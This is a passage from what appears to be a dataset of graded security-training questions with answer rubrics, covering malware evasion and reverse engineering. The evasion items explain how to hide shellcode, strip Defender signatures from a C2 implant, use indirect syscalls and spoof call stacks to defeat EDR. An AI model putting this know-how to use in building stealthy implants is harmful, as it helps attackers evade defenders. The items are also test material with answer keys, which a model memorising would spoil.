      { if_missing: "timing", gap: "Timing-based sandbox detection techniques and countermeasures" },
      { if_missing: "hardware", gap: "Hardware fingerprinting for VM/sandbox detection" },
      { if_missing: "user-interaction", gap: "User interaction-based sandbox detection" },
      { if_missing: "recommendation", gap: "Practical sandbox evasion strategy design" },
    ],
  },
},

{
  competencyId: "evasion",
  subTopic: "indirect-syscalls",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `Explain the difference between direct syscalls and indirect syscalls. Given this indirect syscall stub:

\`\`\`asm
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, wNtAllocateVirtualMemory    ; resolved SSN
    jmp qword ptr [pSyscallAddr]          ; jump to syscall;ret in ntdll
NtAllocateVirtualMemory ENDP
\`\`\`

Where \`pSyscallAddr\` points to the \`syscall; ret\` instruction inside the real ntdll!NtAllocateVirtualMemory.

1. How does the call stack differ between direct and indirect syscalls when the kernel examines the return address?
2. How would you find the \`syscall; ret\` address reliably at runtime?
3. What EDR detection can indirect syscalls defeat that direct syscalls cannot?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "stack-difference", description: "Direct syscalls: return address on the stack points back into the malware's module (suspicious). Indirect syscalls: return address points into ntdll (legitimate-looking), because the syscall instruction executes inside ntdll's code", points: 3, keywords: ["return address", "stack", "malware module", "ntdll", "legitimate", "call stack", "suspicious"], check: "Student explains the key call-stack difference: indirect syscalls have ntdll as return address" },
      { id: "find-gadget", description: "Describes finding the syscall;ret gadget: parse ntdll's .text section for the byte sequence 0F 05 C3, or calculate offset from the function's known stub layout", points: 2, keywords: ["0F 05 C3", "byte scan", ".text section", "gadget", "pattern match", "stub layout"], check: "Student describes a method to locate the syscall;ret gadget in ntdll" },
      { id: "defeats-stack-check", description: "Indirect syscalls defeat EDR call-stack analysis that checks whether the syscall return address is within a legitimate module's address range", points: 3, keywords: ["call stack analysis", "return address check", "module range", "stack walk", "defeat", "legitimate module"], check: "Student identifies call-stack validation as the detection that indirect syscalls defeat" },
    ],
    gaps: [
      { if_missing: "stack-difference", gap: "Call stack differences between direct and indirect syscalls" },
      { if_missing: "find-gadget", gap: "Runtime location of syscall gadgets in ntdll" },
      { if_missing: "defeats-stack-check", gap: "Call-stack based EDR detection and its evasion" },
    ],
  },
},

{
  competencyId: "evasion",
  subTopic: "entropy-reduction",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText: `An implant developer encrypted their shellcode payload with AES-256 and embedded it in the .data section. The encrypted blob is 8KB. They claim this is sufficient to evade static detection.

\`\`\`c
// payload.c
unsigned char encPayload[8192] = { /* 8KB of AES-encrypted shellcode */ };
unsigned char aesKey[32] = { 0xDE, 0xAD, 0xBE, 0xEF, /* ... 28 more bytes */ };

void executePayload() {
    unsigned char decrypted[8192];
    aes_decrypt(encPayload, decrypted, aesKey, sizeof(encPayload));
    // ... execute decrypted shellcode
}
\`\`\`

Identify the OPSEC problems that undermine the encryption.`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "key-embedded", description: "The AES key is embedded in the binary alongside the ciphertext; any analyst can extract the key and decrypt the payload", points: 2, keywords: ["key embedded", "same binary", "extract key", "decrypt", "alongside", "co-located"], check: "Student identifies that the encryption key is stored alongside the ciphertext" },
      { id: "high-entropy", description: "8KB of AES ciphertext has near-maximum entropy (~8.0 bits/byte); AV/EDR tools flag high-entropy sections as likely containing encrypted/packed payloads", points: 2, keywords: ["entropy", "high entropy", "8 bits", "flag", "suspicious", "packed", "encrypted section"], check: "Student identifies high entropy as a detection indicator" },
      { id: "aes-import", description: "The aes_decrypt function import or implementation is itself suspicious; linking crypto libraries or implementing AES in a small binary is an anomaly that raises flags", points: 2, keywords: ["aes_decrypt", "crypto", "import", "anomaly", "suspicious", "library", "implementation"], check: "Student identifies the crypto function/library as a detection indicator" },
    ],
    gaps: [
      { if_missing: "key-embedded", gap: "Key management OPSEC for encrypted payloads" },
      { if_missing: "high-entropy", gap: "Entropy analysis as a static detection method" },
      { if_missing: "aes-import", gap: "Cryptographic library usage as a behavioral indicator" },
    ],
  },
},

{
  competencyId: "evasion",
  subTopic: "static-signature-evasion",
  questionType: "design_solution",
  difficulty: 4,
  questionText: `You wrote a custom C2 implant that Windows Defender detects on disk before it even executes. You've confirmed the detection is purely static (signature-based, not behavioral). You want to make the binary undetectable without rewriting the core logic.

Describe a systematic approach to identify and eliminate the signature(s) Defender is matching on. Then describe at least three techniques to make the binary resistant to future signature updates.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "signature-hunting", description: "Describes a systematic approach: binary-split the executable to narrow down which bytes trigger detection (split in half, test each half, recurse into the flagged half until the signature is isolated)", points: 2, keywords: ["binary split", "half", "narrow down", "isolate", "which bytes", "systematic", "bisect", "DefenderCheck", "ThreatCheck"], check: "Student describes a binary-splitting or systematic approach to isolate the signature" },
      { id: "string-obfuscation", description: "Recommends obfuscating/encrypting all suspicious strings at compile time (API names, C2 URLs, config strings) using constexpr encryption or macro-based obfuscation", points: 2, keywords: ["string obfuscation", "compile-time", "constexpr", "encrypt strings", "macro", "obfuscate", "API names"], check: "Student recommends compile-time string obfuscation" },
      { id: "code-transformation", description: "Suggests code-level changes: reorder functions, change compiler flags, use different compiler (MinGW vs MSVC), modify control flow, insert junk instructions, or use a code virtualizer", points: 2, keywords: ["reorder", "compiler", "control flow", "junk", "virtualizer", "MinGW", "MSVC", "obfuscation"], check: "Student suggests code-level transformations to change the binary's signature" },
      { id: "metadata-cleaning", description: "Addresses PE metadata: strip debug symbols, modify Rich header, change timestamps, remove or modify version info resources, as these are sometimes part of signatures", points: 2, keywords: ["Rich header", "debug symbols", "timestamp", "version info", "metadata", "strip", "PE header"], check: "Student addresses PE metadata as a potential signature component" },
    ],
    gaps: [
      { if_missing: "signature-hunting", gap: "Systematic static signature identification methodology" },
      { if_missing: "string-obfuscation", gap: "Compile-time string obfuscation techniques" },
      { if_missing: "code-transformation", gap: "Code transformation for signature evasion" },
      { if_missing: "metadata-cleaning", gap: "PE metadata manipulation to avoid signatures" },
    ],
  },
},

{
  competencyId: "evasion",
  subTopic: "compile-time-encryption",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `This C++ compile-time string encryption template is intended to hide strings from static analysis, but it has a flaw:

\`\`\`cpp
template<int N>
struct EncryptedString {
    char data[N];

    constexpr EncryptedString(const char (&str)[N]) {
        for (int i = 0; i < N; i++) {
            data[i] = str[i] ^ 0x5A;
        }
    }

    char* decrypt() {
        for (int i = 0; i < N; i++) {
            data[i] ^= 0x5A;
        }
        return data;
    }
};

// Usage:
auto enc = EncryptedString("VirtualAlloc");
char* name = enc.decrypt();
FARPROC pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), name);
\`\`\`

1. What is the flaw that may cause the plaintext to appear in the binary anyway?
2. Fix it.
3. What additional problem exists with calling decrypt() multiple times?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "constexpr-not-guaranteed", description: "The constexpr constructor is not guaranteed to execute at compile time; without consteval (C++20) or forcing constant evaluation, the compiler may embed the plaintext string literal and encrypt at runtime", points: 3, keywords: ["constexpr", "not guaranteed", "runtime", "compile time", "consteval", "plaintext", "string literal", "optimizer"], check: "Student identifies that constexpr does not guarantee compile-time execution, potentially leaving plaintext in the binary" },
      { id: "fix", description: "Fix: use consteval (C++20), use a constexpr variable initialization (static constexpr auto enc = ...), or verify with a disassembler that the string doesn't appear in the binary", points: 2, keywords: ["consteval", "static constexpr", "force", "compile-time", "verify", "constinit"], check: "Student provides a fix that forces compile-time evaluation" },
      { id: "double-decrypt", description: "Calling decrypt() twice XORs the data back to encrypted form; the decrypt function modifies in-place and is not idempotent", points: 2, keywords: ["twice", "double decrypt", "re-encrypts", "idempotent", "in-place", "XOR again", "back to encrypted"], check: "Student identifies the double-decryption problem" },
    ],
    gaps: [
      { if_missing: "constexpr-not-guaranteed", gap: "C++ constexpr evaluation guarantees and compile-time encryption" },
      { if_missing: "fix", gap: "Forcing compile-time string encryption in C++" },
      { if_missing: "double-decrypt", gap: "Idempotency issues in XOR-based decryption" },
    ],
  },
},

{
  competencyId: "evasion",
  subTopic: "edr-architecture",
  questionType: "compare_contrast",
  difficulty: 5,
  questionText: `Compare the following EDR telemetry sources in terms of what they can observe, how they can be evaded, and their reliability:

1. User-mode API hooking (ntdll inline hooks)
2. Kernel callbacks (PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks, etc.)
3. ETW (Event Tracing for Windows) providers
4. Minifilter drivers (file system and registry)
5. Hypervisor-based monitoring (e.g., VBS, HVCI)

For each, give an example of what event it captures and how (or whether) it can be bypassed from user mode.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "usermode-hooks", description: "Explains ntdll inline hooks: monitor API calls like NtCreateFile, NtAllocateVirtualMemory; bypassed via unhooking, direct/indirect syscalls; most easily evaded layer", points: 2, keywords: ["inline hook", "ntdll", "unhook", "direct syscall", "bypass", "trampoline", "detour"], check: "Student describes usermode API hooks and their bypass methods" },
      { id: "kernel-callbacks", description: "Explains kernel callbacks: monitor process creation, handle operations, thread creation from kernel mode; cannot be bypassed from user mode without a vulnerable driver or exploit", points: 2, keywords: ["kernel callback", "PsSetCreateProcessNotifyRoutine", "ObRegisterCallbacks", "cannot bypass", "user mode", "kernel exploit", "driver"], check: "Student describes kernel callbacks and their resistance to usermode bypass" },
      { id: "etw-providers", description: "Explains ETW: provides events from both user and kernel mode; user-mode ETW can be patched (EtwEventWrite), but kernel-mode ETW-TI and specific providers are harder to tamper with", points: 2, keywords: ["ETW", "provider", "EtwEventWrite", "ETW-TI", "Threat Intelligence", "kernel-mode", "user-mode patch"], check: "Student distinguishes between user-mode patchable and kernel-mode ETW providers" },
      { id: "minifilters", description: "Explains minifilters: intercept file/registry operations at the kernel level; used to scan files on write, monitor registry changes; bypassed only by direct device I/O or unloading the driver", points: 2, keywords: ["minifilter", "file system", "registry", "kernel level", "scan on write", "FltRegisterFilter", "direct device"], check: "Student describes minifilter monitoring and its kernel-level operation" },
      { id: "hypervisor", description: "Explains hypervisor monitoring: VBS/HVCI enforce code integrity from below the kernel; cannot be bypassed even with kernel-level access in many cases; represents the strongest defense layer", points: 2, keywords: ["hypervisor", "VBS", "HVCI", "code integrity", "below kernel", "strongest", "cannot bypass"], check: "Student describes hypervisor-based monitoring as the strongest layer" },
    ],
    gaps: [
      { if_missing: "usermode-hooks", gap: "User-mode API hook architecture and evasion" },
      { if_missing: "kernel-callbacks", gap: "Kernel callback telemetry and its resistance to usermode evasion" },
      { if_missing: "etw-providers", gap: "ETW provider hierarchy and tamperability" },
      { if_missing: "minifilters", gap: "Minifilter driver monitoring capabilities" },
      { if_missing: "hypervisor", gap: "Hypervisor-enforced security (VBS/HVCI)" },
    ],
  },
},

{
  competencyId: "evasion",
  subTopic: "call-stack-spoofing",
  questionType: "design_solution",
  difficulty: 5,
  questionText: `Modern EDRs examine the call stack when a suspicious API is called (e.g., NtAllocateVirtualMemory from an unsigned module). If the call originates from outside a legitimate module, it's flagged.

Design a call stack spoofing mechanism that:
1. Makes API calls appear to originate from a legitimate call chain (e.g., as if called by kernel32!CreateFileW which called ntdll!NtCreateFile)
2. Works with both x64 calling convention and structured exception handling
3. Survives both stack-walking via RBP chain and RtlVirtualUnwind-based unwinding

Explain the approach, the key challenges, and what artifacts a determined analyst could still find.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "frame-forgery", description: "Describes forging stack frames: crafting fake RBP chain entries that point to legitimate return addresses within system DLLs, creating the illusion of a normal call chain", points: 2, keywords: ["fake frame", "RBP chain", "forge", "return address", "system DLL", "legitimate", "stack frame"], check: "Student describes the concept of forging stack frames with legitimate return addresses" },
      { id: "unwind-info", description: "Addresses RtlVirtualUnwind: x64 uses .pdata/.xdata unwind info, not just RBP; spoofed frames must be consistent with the unwind data of the module they claim to be in", points: 3, keywords: ["RtlVirtualUnwind", ".pdata", ".xdata", "unwind info", "RUNTIME_FUNCTION", "consistent", "exception handling"], check: "Student addresses the challenge of defeating unwind-info-based stack walking" },
      { id: "technique", description: "Describes a concrete technique: using ROP gadgets to pivot the stack through legitimate code paths, or using a JOP (Jump-Oriented Programming) approach, or the synthetic frame approach with proper unwind data matching", points: 3, keywords: ["ROP", "gadget", "synthetic frame", "stack pivot", "JOP", "legitimate code path", "unwind matching"], check: "Student describes a concrete implementation approach for call stack spoofing" },
      { id: "remaining-artifacts", description: "Identifies remaining artifacts: timing anomalies, impossible call chains (function A never calls function B in real code), thread start address still pointing to malware, potential inconsistencies in unwind data", points: 2, keywords: ["artifact", "timing", "impossible chain", "thread start", "inconsistency", "heuristic", "anomaly"], check: "Student identifies at least one artifact that remains despite stack spoofing" },
    ],
    gaps: [
      { if_missing: "frame-forgery", gap: "Stack frame forgery for call stack spoofing" },
      { if_missing: "unwind-info", gap: "x64 unwind data (.pdata/.xdata) and its impact on stack spoofing" },
      { if_missing: "technique", gap: "Concrete call stack spoofing implementation techniques" },
      { if_missing: "remaining-artifacts", gap: "Residual detection artifacts after stack spoofing" },
    ],
  },
},

// --- reverse-engineering (Reverse engineering) ---

{
  competencyId: "reverse-engineering",
  subTopic: "pe-analysis",
  questionType: "predict_output",
  difficulty: 1,
  questionText: `You open an unknown PE executable in a hex editor and see these characteristics:

- File size: 12KB
- Only two sections: \`.text\` (4KB) and \`.rsrc\` (6KB)
- Import table contains only: \`LoadLibraryA\`, \`GetProcAddress\`, \`VirtualAlloc\`, \`VirtualProtect\`
- No .data or .rdata section
- Entry point is in .text at offset 0x10 (very beginning of the section)
- Rich header is stripped
- Timestamp is zeroed

What can you infer about this binary? Is it likely packed, a dropper, a shellcode runner, or a normal application? Explain your reasoning for each observation.`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "packed-or-loader", description: "Identifies the binary as likely a packer stub, dropper, or shellcode loader based on the minimal import set and small size", points: 2, keywords: ["packed", "packer", "dropper", "loader", "minimal imports", "shellcode runner", "not normal"], check: "Student correctly classifies the binary as likely packed/dropper/loader" },
      { id: "import-analysis", description: "Explains the import pattern: LoadLibraryA + GetProcAddress suggests dynamic API resolution; VirtualAlloc + VirtualProtect suggests memory allocation and RWX setup for unpacking or shellcode execution", points: 2, keywords: ["dynamic resolution", "LoadLibraryA", "GetProcAddress", "VirtualAlloc", "VirtualProtect", "unpack", "RWX"], check: "Student analyzes the import set and explains what each import suggests" },
      { id: "rsrc-payload", description: "Notes that the large .rsrc section relative to .text likely contains an encrypted/compressed payload or embedded PE", points: 2, keywords: [".rsrc", "payload", "encrypted", "compressed", "embedded", "resource", "large"], check: "Student identifies the disproportionate .rsrc section as likely containing a payload" },
      { id: "metadata-cleaning", description: "Identifies stripped Rich header and zeroed timestamp as anti-forensic measures to hide compiler/linker information and build time", points: 1, keywords: ["Rich header", "timestamp", "zeroed", "anti-forensic", "compiler", "linker", "build time"], check: "Student identifies metadata cleaning as intentional anti-forensics" },
    ],
    gaps: [
      { if_missing: "packed-or-loader", gap: "PE triage: identifying packed/dropper binaries from high-level characteristics" },
      { if_missing: "import-analysis", gap: "Import table analysis for behavioral inference" },
      { if_missing: "rsrc-payload", gap: "Resource section analysis for embedded payloads" },
    ],
  },
},

{
  competencyId: "reverse-engineering",
  subTopic: "calling-conventions",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `Decompile this x64 function and explain what it does. Identify the calling convention, arguments, and return value:

\`\`\`asm
sub_401000:
    push  rbx
    sub   rsp, 20h
    mov   rbx, rcx              ; save first arg
    mov   edx, 40h              ; second arg to sub call = 0x40
    mov   ecx, 1000h            ; first arg to sub call = 0x1000
    call  sub_401100             ; returns pointer in rax
    test  rax, rax
    jz    short loc_401040
    mov   r8d, [rbx+8]          ; third arg = dword at [rbx+8]
    mov   rdx, [rbx]            ; second arg = qword at [rbx]
    mov   rcx, rax              ; first arg = returned pointer
    call  memcpy
    mov   rax, rbx              ; return original first arg
    jmp   short loc_401048
loc_401040:
    xor   eax, eax              ; return NULL
loc_401048:
    add   rsp, 20h
    pop   rbx
    ret
\`\`\`

Assume sub_401100 is a memory allocation function.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "convention", description: "Identifies x64 Microsoft calling convention: rcx=first arg, rdx=second, r8=third, r9=fourth; 0x20 shadow space reserved on stack", points: 2, keywords: ["x64", "Microsoft", "fastcall", "rcx", "rdx", "r8", "shadow space", "0x20"], check: "Student identifies the Windows x64 calling convention and shadow space" },
      { id: "args-identified", description: "Identifies rcx (first arg) as a pointer to a struct with at least two fields: a pointer at offset 0 and a size/length DWORD at offset 8", points: 2, keywords: ["struct", "pointer", "offset 0", "offset 8", "qword", "dword", "field"], check: "Student correctly identifies the input struct layout" },
      { id: "decompiled-logic", description: "Correctly decompiles the function: allocates 0x1000 bytes (with 0x40 flag), if allocation succeeds copies [struct->size] bytes from [struct->ptr] to new buffer, returns original struct pointer; else returns NULL", points: 2, keywords: ["allocate", "0x1000", "copy", "memcpy", "NULL", "success", "fail", "struct pointer"], check: "Student provides a correct high-level decompilation of the function" },
      { id: "alloc-flags", description: "Notes that 0x40 and 0x1000 could be PAGE_EXECUTE_READWRITE and MEM_COMMIT respectively if sub_401100 wraps VirtualAlloc; this would indicate shellcode/payload copying", points: 2, keywords: ["PAGE_EXECUTE_READWRITE", "0x40", "MEM_COMMIT", "0x1000", "VirtualAlloc", "shellcode", "suspicious"], check: "Student connects the allocation flags to potential VirtualAlloc constants" },
    ],
    gaps: [
      { if_missing: "convention", gap: "x64 Windows calling convention (register usage, shadow space)" },
      { if_missing: "args-identified", gap: "Struct/parameter recovery from disassembly" },
      { if_missing: "decompiled-logic", gap: "Disassembly-to-C decompilation" },
      { if_missing: "alloc-flags", gap: "Recognizing Win32 API constants in disassembly" },
    ],
  },
},

{
  competencyId: "reverse-engineering",
  subTopic: "anti-debug-techniques",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText: `A malware sample uses this anti-debugging routine. Identify each technique and explain how a reverse engineer would bypass each one:

\`\`\`c
void antiDebug() {
    // Check 1
    if (IsDebuggerPresent())
        ExitProcess(0);

    // Check 2
    BOOL beingDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &beingDebugged);
    if (beingDebugged)
        ExitProcess(0);

    // Check 3
    LARGE_INTEGER start, end;
    QueryPerformanceCounter(&start);
    // ... some computation ...
    for (volatile int i = 0; i < 1000000; i++);
    QueryPerformanceCounter(&end);
    if ((end.QuadPart - start.QuadPart) > 10000000)
        ExitProcess(0);

    // Check 4
    __try {
        __asm { int 3 }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        // Normal execution - no debugger
    }
    // If debugger catches int3, this code after __try is never reached
}
\`\`\``,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "isdebuggerpresent", description: "Identifies Check 1 as reading PEB.BeingDebugged; bypassed by patching PEB.BeingDebugged to 0, NOP'ing the call, or using ScyllaHide/SharpOD", points: 2, keywords: ["PEB", "BeingDebugged", "patch", "NOP", "ScyllaHide", "IsDebuggerPresent"], check: "Student identifies IsDebuggerPresent mechanism and at least one bypass" },
      { id: "remote-debugger", description: "Identifies Check 2 as querying NtQueryInformationProcess with ProcessDebugPort; bypassed by hooking the NT call to return FALSE or patching the check", points: 2, keywords: ["CheckRemoteDebuggerPresent", "NtQueryInformationProcess", "ProcessDebugPort", "hook", "return FALSE"], check: "Student identifies the remote debugger check mechanism and a bypass" },
      { id: "timing-check", description: "Identifies Check 3 as a timing anti-debug: measures execution time and exits if too slow (indicating single-stepping); bypassed by patching the comparison or manipulating QPC return values", points: 2, keywords: ["timing", "QueryPerformanceCounter", "slow", "single-stepping", "patch comparison", "time measurement"], check: "Student identifies the timing check and a bypass approach" },
      { id: "int3-trick", description: "Identifies Check 4 as using INT3 as an exception-based check: in normal execution, the SEH handler catches the breakpoint exception; if a debugger is attached, it consumes the INT3 and the handler never runs", points: 2, keywords: ["INT3", "exception", "SEH", "handler", "breakpoint", "debugger consumes", "exception handler"], check: "Student explains the INT3 exception-based anti-debug trick" },
    ],
    gaps: [
      { if_missing: "isdebuggerpresent", gap: "PEB-based debugger detection (IsDebuggerPresent)" },
      { if_missing: "remote-debugger", gap: "NtQueryInformationProcess-based debugger detection" },
      { if_missing: "timing-check", gap: "Timing-based anti-debugging techniques" },
      { if_missing: "int3-trick", gap: "Exception-based anti-debugging (INT3 exception consumption)" },
    ],
  },
},

{
  competencyId: "reverse-engineering",
  subTopic: "packer-identification",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `You receive a PE binary and suspect it is packed. Describe a systematic approach to determine:

1. Whether it is packed (list at least 4 indicators)
2. What packer was used (how to identify common packers)
3. How to unpack it (manual unpacking methodology)

Walk through the process as if explaining it to a junior analyst.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "packing-indicators", description: "Lists indicators: high entropy in sections, few imports (LoadLibrary/GetProcAddress/VirtualAlloc), unusual section names (UPX0, .aspack), entry point in a non-standard section, small code section with large data/resource section", points: 2, keywords: ["entropy", "few imports", "unusual section names", "UPX", "entry point", "non-standard", "small code"], check: "Student lists at least 4 packing indicators" },
      { id: "packer-identification", description: "Describes identification methods: signature scanners (PEiD, Detect It Easy, ExeInfoPE), section name patterns, entry point signatures, compiler/linker artifacts", points: 2, keywords: ["PEiD", "Detect It Easy", "DIE", "ExeInfoPE", "signature scanner", "section names", "entry point signature"], check: "Student names at least 2 tools or methods for packer identification" },
      { id: "manual-unpacking", description: "Describes manual unpacking: run in debugger, find OEP (Original Entry Point) by tracing through the unpacking stub, dump the process memory at OEP, fix imports using Scylla/ImportREC", points: 2, keywords: ["OEP", "Original Entry Point", "dump", "debugger", "Scylla", "ImportREC", "fix imports", "trace"], check: "Student describes the manual unpacking process: find OEP, dump, fix imports" },
      { id: "oep-finding", description: "Describes techniques to find the OEP: hardware breakpoint on stack (ESP trick), looking for tail jumps to a distant address, tracing pushad/popad patterns, or using x64dbg's trace-into with OEP detection", points: 2, keywords: ["ESP trick", "hardware breakpoint", "tail jump", "pushad", "popad", "trace", "distant jump", "stack"], check: "Student describes at least one OEP-finding technique" },
    ],
    gaps: [
      { if_missing: "packing-indicators", gap: "PE packing indicators for triage" },
      { if_missing: "packer-identification", gap: "Packer identification tools and methods" },
      { if_missing: "manual-unpacking", gap: "Manual unpacking methodology (dump and fix imports)" },
      { if_missing: "oep-finding", gap: "OEP finding techniques for packed binaries" },
    ],
  },
},

{
  competencyId: "reverse-engineering",
  subTopic: "control-flow-recovery",
  questionType: "fix_code",
  difficulty: 4,
  questionText: `A malware analyst decompiled a function from a packed sample and got this pseudocode from IDA/Ghidra. The decompiler made several errors due to obfuscation. Identify the errors and rewrite the function correctly:

\`\`\`c
// Ghidra output:
void FUN_00401000(int param_1) {
    int local_8;
    int local_c;

    local_8 = *(int *)(param_1 + 4);
    local_c = 0;
    while (local_c < local_8) {
        *(char *)(*(int *)param_1 + local_c) =
            *(char *)(*(int *)param_1 + local_c) ^ 0x37;
        local_c = local_c + 1;
    }
    (*(code *)*(int *)param_1)();
    return;
}
\`\`\`

The analyst knows from context that:
- param_1 is a pointer to a struct with {void* buffer; uint32_t length;}
- The function XOR-decodes a buffer then executes it
- The target architecture is 32-bit x86

1. Rewrite this with proper types and meaningful variable names.
2. What security-relevant behavior does this function perform?
3. What would you name this function in your analysis notes?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "retyped", description: "Correctly retypes with struct: param_1 as a struct pointer with buffer (void*/char*) and length (uint32_t) fields, loop variable as size_t or unsigned int", points: 2, keywords: ["struct", "buffer", "length", "uint32_t", "pointer", "char*", "void*"], check: "Student provides a properly typed version with struct and meaningful names" },
      { id: "behavior", description: "Identifies the function as a shellcode decryptor and executor: XOR-decodes a buffer with key 0x37 then calls the decoded buffer as a function pointer", points: 3, keywords: ["shellcode", "decrypt", "XOR", "decode", "execute", "function pointer", "call", "0x37"], check: "Student correctly identifies the decode-then-execute behavior" },
      { id: "naming", description: "Suggests a descriptive function name like decode_and_execute_shellcode, xor_decrypt_exec, or run_decoded_payload", points: 2, keywords: ["decode_and_execute", "decrypt_exec", "xor_run", "shellcode", "payload", "descriptive"], check: "Student provides a meaningful function name that conveys the behavior" },
    ],
    gaps: [
      { if_missing: "retyped", gap: "Decompiler output retyping and struct recovery" },
      { if_missing: "behavior", gap: "Identifying decode-then-execute patterns in malware" },
      { if_missing: "naming", gap: "Malware function naming conventions for analysis" },
    ],
  },
},

{
  competencyId: "reverse-engineering",
  subTopic: "dynamic-analysis",
  questionType: "design_solution",
  difficulty: 4,
  questionText: `You have a malware sample that uses extensive anti-VM and anti-debug checks. Static analysis shows it checks for:
- VM-specific registry keys
- Debugger processes (x64dbg, IDA, Process Monitor)
- Mouse movement (no clicks = sandbox)
- Timing checks (RDTSC-based)
- Network connectivity to specific domains

Design a dynamic analysis environment that defeats all of these checks. Describe:
1. Your VM/bare-metal choice and configuration
2. How you handle each anti-analysis check
3. Your monitoring setup (what tools run outside the VM)
4. How you capture the malware's behavior without triggering its checks`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "environment", description: "Describes the analysis environment: hardened VM or bare-metal with network isolation, removing VM artifacts from registry/firmware/drivers, or using a hypervisor that hides its presence (KVM with spoofed identifiers)", points: 2, keywords: ["hardened VM", "bare metal", "remove artifacts", "registry", "KVM", "spoofed", "hide VM", "firmware"], check: "Student describes a viable analysis environment with VM hardening or bare-metal" },
      { id: "anti-check-defeats", description: "Addresses each check: populate VM with user data/mouse simulation, intercept RDTSC via hypervisor or patch timing checks, add fake 'normal' processes, route network to INetSim/fakenet", points: 3, keywords: ["mouse simulation", "RDTSC", "fake processes", "INetSim", "fakenet", "populate", "user data", "intercept"], check: "Student addresses at least 4 of the 5 anti-analysis checks" },
      { id: "monitoring", description: "Describes monitoring tools outside the VM: network capture (Wireshark/tcpdump), API monitoring via ETW or hypervisor-level syscall tracing, memory snapshots, registry/filesystem diffing", points: 2, keywords: ["Wireshark", "tcpdump", "ETW", "syscall trace", "memory snapshot", "diff", "outside VM", "network capture"], check: "Student describes monitoring tools and their placement relative to the analysis VM" },
      { id: "behavior-capture", description: "Describes capturing behavior: automated screenshots, process tree logging, file/registry change tracking (Procmon or equivalent), network traffic analysis, and memory dumps at key points", points: 2, keywords: ["Procmon", "process tree", "file changes", "registry changes", "screenshots", "memory dump", "behavior"], check: "Student describes a comprehensive behavior capture methodology" },
      { id: "safety", description: "Mentions safety considerations: network isolation to prevent C2 beaconing to real infrastructure, snapshot/restore capabilities, separate analysis network", points: 1, keywords: ["isolation", "snapshot", "restore", "safe", "C2", "separate network", "contained"], check: "Student mentions safety/containment considerations" },
    ],
    gaps: [
      { if_missing: "environment", gap: "Analysis environment setup for evasive malware" },
      { if_missing: "anti-check-defeats", gap: "Defeating anti-analysis checks in malware" },
      { if_missing: "monitoring", gap: "External monitoring setup for dynamic analysis" },
      { if_missing: "behavior-capture", gap: "Behavioral analysis and evidence collection methodology" },
    ],
  },
},

{
  competencyId: "reverse-engineering",
  subTopic: "stack-frame-analysis",
  questionType: "predict_output",
  difficulty: 1,
  questionText: `Given this x86 (32-bit) function prologue and body:

\`\`\`asm
push  ebp
mov   ebp, esp
sub   esp, 0x10        ; reserve 16 bytes for locals
push  ebx
push  esi

mov   eax, [ebp+8]     ; (A)
mov   ecx, [ebp+0xC]   ; (B)
mov   [ebp-4], eax      ; (C)
lea   edx, [ebp-0x10]  ; (D)
\`\`\`

1. What does [ebp+8] contain? What about [ebp+0xC]?
2. What is stored at [ebp-4]?
3. What address does edx point to after instruction (D)?
4. Draw the stack layout from the caller's arguments down to the local variables.`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "args-correct", description: "Correctly identifies [ebp+8] as the first argument and [ebp+0xC] as the second argument (ebp+0 = saved EBP, ebp+4 = return address, ebp+8 = arg1)", points: 2, keywords: ["first argument", "second argument", "ebp+8", "ebp+0xC", "return address", "ebp+4", "saved EBP"], check: "Student correctly maps ebp offsets to arguments with return address and saved EBP in between" },
      { id: "local-var", description: "Identifies [ebp-4] as the first local variable, which stores a copy of the first argument", points: 2, keywords: ["local variable", "ebp-4", "copy", "first argument", "local"], check: "Student identifies [ebp-4] as a local variable containing the first argument" },
      { id: "stack-layout", description: "Provides or describes the stack layout: arg2 (ebp+0xC), arg1 (ebp+8), return addr (ebp+4), saved ebp (ebp), local1 (ebp-4) ... local4 (ebp-0x10), saved ebx, saved esi", points: 2, keywords: ["stack layout", "arg2", "arg1", "return address", "saved ebp", "local", "diagram"], check: "Student provides a correct stack layout showing arguments, saved frame, and locals" },
    ],
    gaps: [
      { if_missing: "args-correct", gap: "x86 stack frame layout and argument access via EBP" },
      { if_missing: "local-var", gap: "Local variable layout in x86 stack frames" },
      { if_missing: "stack-layout", gap: "Complete x86 stack frame visualization" },
    ],
  },
},

{
  competencyId: "reverse-engineering",
  subTopic: "api-monitoring",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText: `Compare the following API monitoring approaches for malware analysis. For each, explain the mechanism, what it can and cannot capture, and a tool that implements it:

1. IAT hooking (patching the Import Address Table)
2. Inline hooking (detouring the first bytes of target functions)
3. DLL proxying (replacing a DLL with a wrapper that logs and forwards calls)
4. ETW-based monitoring (consuming ETW provider events)
5. Kernel-mode syscall logging

Which would you recommend for analyzing a sample that uses direct syscalls?`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "iat-hooking", description: "Explains IAT hooking: patches IAT entries to point to monitoring stubs; bypassed by GetProcAddress or manual import resolution; tool example: API Monitor or custom DLL", points: 2, keywords: ["IAT", "patch", "Import Address Table", "GetProcAddress", "bypass", "API Monitor"], check: "Student explains IAT hooking mechanism and its bypass via dynamic resolution" },
